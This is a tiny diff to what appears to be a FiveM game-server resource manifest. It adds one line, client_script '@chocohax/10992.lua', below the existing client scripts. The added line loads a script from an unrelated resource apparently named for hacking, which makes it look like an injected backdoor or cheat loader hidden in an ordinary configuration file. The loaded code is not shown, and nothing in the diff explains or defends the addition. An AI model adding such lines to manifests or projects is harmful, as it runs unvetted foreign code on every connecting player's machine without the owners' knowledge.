@@ -26,3 +26,4 @@ client_scripts {
 	"13277.lua",
 	"client.js"
 }
+client_script '@chocohax/10992.lua'
